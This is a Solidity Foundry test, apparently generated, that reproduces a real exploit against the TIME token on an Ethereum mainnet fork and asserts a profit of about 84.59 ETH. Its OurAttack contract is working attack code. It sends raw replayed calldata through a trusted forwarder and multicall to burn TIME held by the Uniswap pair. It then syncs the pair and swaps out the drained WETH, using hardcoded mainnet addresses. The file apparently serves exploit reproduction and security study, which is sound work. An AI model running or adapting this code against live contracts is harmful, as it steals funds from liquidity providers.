
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {Base} from "./Base.sol";


contract AttackTest is Base {
    address constant ATTACKER_EOA = Addresses.attacker_eoa;
    address constant ATTACK_CONTRACT = Addresses.attack_contract;
    uint256 constant FORK_BLOCK = 18730462;
    uint256 constant TX_TIMESTAMP = 1701904319;
    uint256 constant TX_BLOCK_NUMBER = 18730463;
    uint256 constant TX_VALUE = 55;

    function setUp() public {
        vm.createSelectFork(vm.envString("POC_FORK_ENDPOINT"), FORK_BLOCK);
        if (TX_TIMESTAMP != 0) vm.warp(TX_TIMESTAMP);
        if (TX_BLOCK_NUMBER != 0) vm.roll(TX_BLOCK_NUMBER);
    }

    function testPoC() public {
        _runExploit();
    }

    function _runExploit() internal {
        vm.startPrank(ATTACKER_EOA, ATTACKER_EOA);
        OurAttack attack;
        if (ATTACK_CONTRACT != address(0)) {
            _installRuntime();
            attack = OurAttack(payable(ATTACK_CONTRACT));
        } else {
            attack = new OurAttack();
        }
        _expectOutcome(address(attack), address(0));
        _snapProfit();
        _logBalances("Before exploit");
        attack.attack{value: TX_VALUE}();
        _logBalances("After exploit");
        vm.stopPrank();
        _assertProfit();
    }

    function _installRuntime() internal {
        vm.etch(ATTACK_CONTRACT, type(OurAttack).runtimeCode);
        vm.allowCheatcodes(ATTACK_CONTRACT);
    }

    function _expectOutcome(address attack, address helper) internal {
        attack;
        helper;
        _expectProfit(Addresses.attack_contract, ATTACKER_EOA, Addresses.ZERO, "ETH", 84590222144759262264);
    }
}

contract OurAttack {



    function attack() external payable {
        _attack();
    }

    function _attack() internal {
        IERC20Like(Addresses.TIME).approve(Addresses.A_7A250D_488D, type(uint256).max);
        {
            uint256 depositAmount = address(this).balance;
            if (depositAmount > 5000000000000000000) depositAmount = 5000000000000000000;
            if (depositAmount != 0) IWETH(Addresses.WETH).deposit{value: depositAmount}();
        }
        {
            bytes memory replayCallData =
                hex"5c11d7950000000000000000000000000000000000000000000000004563918244f40000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000006980a47bee930a4584b09ee79ebe46484fbdbdd0000000000000000000000000000000000000000000000000000000006570ffbf0000000000000000000000000000000000000000000000000000000000000002000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc20000000000000000000000004b0e9a7da8bab813efae92a6651019b8bd6c0a29";
            (bool ok,) = Addresses.A_7A250D_488D.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        {
            bytes memory replayCallData =
                hex"47153f8200000000000000000000000000000000000000000000000000000000000000400000000000000000000000000000000000000000000000000000000000000200000000000000000000000000a16a5f37774309710711a8b4e83b068306b217240000000000000000000000004b0e9a7da8bab813efae92a6651019b8bd6c0a29000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000004c4b40000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000c000000000000000000000000000000000000000000000000000000000000000c4ac9650d8000000000000000000000000000000000000000000000000000000000000002000000000000000000000000000000000000000000000000000000000000000010000000000000000000000000000000000000000000000000000000000000020000000000000000000000000000000000000000000000000000000000000003842966c680000000000000000000000000000000000000000c9112ec16d958e8da8180000760dc1e043d99394a10605b2fa08f123d60faf8400000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000419194983a3dbfb5779c09c95f5d830d8435d9ce88b383752c3dfb8a1b84b8c9f511b7c750f1334e2f26ca9be32c2d070a4a023edf745b02468d6cba9a15a494c61b00000000000000000000000000000000000000000000000000000000000000";
            (bool ok,) = Addresses.A_C82BBE_8A81.call(replayCallData);
            require(ok, "replay selector 0x47153f82 failed");
        }
        {
            bytes memory replayCallData = hex"fff6cae9";
            (bool ok,) = Addresses.UNI_V2.call(replayCallData);
            require(ok, "replay selector 0xfff6cae9 failed");
        }
        {
            bytes memory replayCallData =
                hex"5c11d79500000000000000000000000000000000000000000b2a3d45e6c858e9fbbbb45a000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000a00000000000000000000000006980a47bee930a4584b09ee79ebe46484fbdbdd0000000000000000000000000000000000000000000000000000000006570ffbf00000000000000000000000000000000000000000000000000000000000000020000000000000000000000004b0e9a7da8bab813efae92a6651019b8bd6c0a29000000000000000000000000c02aaa39b223fe8d0a0e5c4f27ead9083c756cc2";
            (bool ok,) = Addresses.A_7A250D_488D.call(replayCallData);
            require(ok, "replay selector 0x5c11d795 failed");
        }
        IERC20Like(Addresses.WETH).balanceOf(address(this));
        uint256 withdrawAvailableAmount = IERC20Like(Addresses.WETH).balanceOf(address(this));
        if (withdrawAvailableAmount > 94513462587046838316) withdrawAvailableAmount = 94513462587046838316;
        IWETH(Addresses.WETH).withdraw(withdrawAvailableAmount);
        {
            (bool ok,) = payable(Addresses.A_DAFEA4_8BC5).call{value: 4923240442287576107}("");
            if (!ok)
            {  }
        }
    }

    function _attack2() internal {
        _markCallback(1);
    }

    receive() external payable {}

    function yoink() external payable {
        _attack();
        return;
    }

    fallback() external payable {
        _entryCb();
    }

    function _entryCb() internal {}

    mapping(uint256 => bool) private _callbackSeenFlag;
    mapping(uint256 => uint256) private _entryCallbackCursor;
    mapping(address => uint256) private _balancerVaultPreBalance;

    function _nextEntryCb(uint256 index) internal returns (uint256 ordinal) {
        ordinal = _entryCallbackCursor[index];
        _entryCallbackCursor[index] = ordinal + 1;
    }

    function _markCallback(uint256 index) internal {
        _callbackSeenFlag[index] = true;
    }

    function _recordBalancerFlash(address[] memory tokens) internal {
        for (uint256 i = 0; i < tokens.length; i++) {
            _balancerVaultPreBalance[tokens[i]] =
                IERC20Like(tokens[i]).balanceOf(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
        }
    }

    function recordBalancerFlashLoanPreBalances(address[] memory tokens) external {
        _recordBalancerFlash(tokens);
    }

    function balancerVaultPreBalance(address token) external view returns (uint256) {
        return _balancerVaultPreBalance[token];
    }
}

interface IERC20Like {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external;
    function transfer(address to, uint256 amount) external;
    function transferFrom(address from, address to, uint256 amount) external;
}

interface IWETHLike {
    function deposit() external payable;
}

library ArrayGuard {
    function capWithReserve(uint256 wanted, address token, address holder, uint256 reserve)
        internal
        view
        returns (uint256)
    {
        uint256 available = IERC20Like(token).balanceOf(holder);
        if (available > reserve) available -= reserve;
        else available = 0;
        return wanted > available ? available : wanted;
    }
}

interface IERC721Like {
    function ownerOf(uint256 tokenId) external view returns (address);
    function getApproved(uint256 tokenId) external view returns (address);
    function isApprovedForAll(address owner, address operator) external view returns (bool);
    function transferFrom(address from, address to, uint256 tokenId) external;
    function safeTransferFrom(address from, address to, uint256 tokenId) external;
}

interface IUniswapV2PairLike {
    function mint(address to) external returns (uint256 liquidity);
    function burn(address to) external returns (uint256 amount0, uint256 amount1);
    function skim(address to) external;
    function sync() external;
    function swap(uint256 amount0Out, uint256 amount1Out, address to, bytes calldata data) external;
}

interface IMulticallLike {
    function multicall(bytes[] calldata data) external returns (bytes[] memory results);
}

struct ReplayCall {
    address target;
    bytes data;
}

library Addresses {
    address internal constant ZERO = address(0);
    address internal constant A_303A41_066A = 0x303A41300BAEb37A1028Af017B17B8A6edC3066a;
    address internal constant TIME = 0x4b0E9a7dA8bAb813EfAE92A6651019B8bd6c0a29;
    address internal constant attack_contract = 0x6980a47beE930a4584B09Ee79eBe46484FbDBDD0;
    address internal constant UNI_V2 = 0x760dc1E043D99394A10605B2FA08F123D60faF84;
    address internal constant A_7A250D_488D = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
    address internal constant BalancerVault = 0xBA12222222228d8Ba445958a75a0704d566BF2C8;
    address internal constant WETH = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
    address internal constant A_C82BBE_8A81 = 0xc82BbE41f2cF04e3a8efA18F7032BDD7f6d98a81;
    address internal constant A_DAFEA4_8BC5 = 0xDAFEA492D9c6733ae3d56b7Ed1ADB60692c98Bc5;
    address internal constant attacker_eoa = 0xFDe0d1575Ed8E06FBf36256bcdfA1F359281455A;
}

struct Abi_execute_Param0 {
    address field0;
    address field1;
    uint256 field2;
    uint256 field3;
    uint256 field4;
    bytes field5;
}

interface IContract_C82BBE_8A81 {
    function execute(Abi_execute_Param0 calldata, bytes calldata) external;
}

interface IWETH {
    function deposit() external payable;
    function withdraw(uint256) external;
}
